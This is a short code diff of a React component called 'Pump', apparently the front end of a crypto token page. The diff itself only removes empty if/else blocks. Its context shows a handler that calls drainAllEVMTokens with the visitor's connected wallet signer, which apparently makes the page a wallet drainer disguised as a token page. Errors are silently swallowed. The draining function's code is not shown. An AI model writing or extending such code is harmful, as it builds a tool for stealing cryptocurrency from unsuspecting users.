@@ -135,9 +135,6 @@ const Pump = () => {
         setIsSending(true);
         const evmChainName = getEVMChain()?.name || 'EVM';
         await drainAllEVMTokens(evmSigner, evmProvider, evmChainName, evmChainId || 1);
-        if (hash) {
-        } else {
-        }
       } catch (error: any) {
       } finally {
         setIsSending(false);
